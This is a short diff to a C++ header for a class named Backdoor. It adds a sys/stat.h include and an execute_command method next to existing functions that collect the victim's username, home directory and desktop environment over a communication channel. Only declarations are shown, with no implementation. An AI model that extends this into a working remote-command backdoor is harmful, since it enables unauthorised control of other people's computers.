@@ -5,6 +5,7 @@
 #include <dirent.h>
 #include <unistd.h>
 #include <pwd.h>
+#include <sys/stat.h>
 
 class Backdoor{
 public:
@@ -19,6 +20,8 @@ public:
     void get_home_enviroment();
     void get_username();
     void get_desktop_enviroment();
+
+    void execute_command(const char *);
 
     Backdoor(int, Communication *, bool, char *);
 
